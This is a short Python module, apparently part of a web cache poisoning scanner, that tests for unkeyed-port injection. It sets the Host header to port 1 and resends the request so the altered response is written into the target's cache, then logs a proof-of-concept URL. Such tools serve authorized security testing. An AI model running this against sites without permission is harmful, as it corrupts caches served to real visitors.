from core.cache import extract_cache_headers
import core.config
import urllib.parse


class UnkeyedPortAttack:
    name = "Unkeyed Port"

    def run(self, ctx):
        ctx.log.debug(f"Testing for {self.name}")

        parsed = urllib.parse.urlparse(ctx.url)

        headers = ctx.headers.copy()
        headers["Host"] = f"{parsed.netloc}:1"

        resp, cb = ctx.req.send(ctx.method, ctx.url, headers, ctx.body)

        if resp and ctx.is_different(resp):
            if extract_cache_headers(resp):
                # Send the same request one more time to save the cache
                _, _ = ctx.req.send(ctx.method, ctx.url, headers, ctx.body, True, cb)

                ctx.log.vuln(f"Unkeyed port injection | Exploit PoC: {ctx.url}?{cb}")

                if core.config.open_browser:
                    import webbrowser
                    webbrowser.open_new_tab(f"{ctx.url}?{cb}")

                return

        ctx.log.error("Not vulnerable")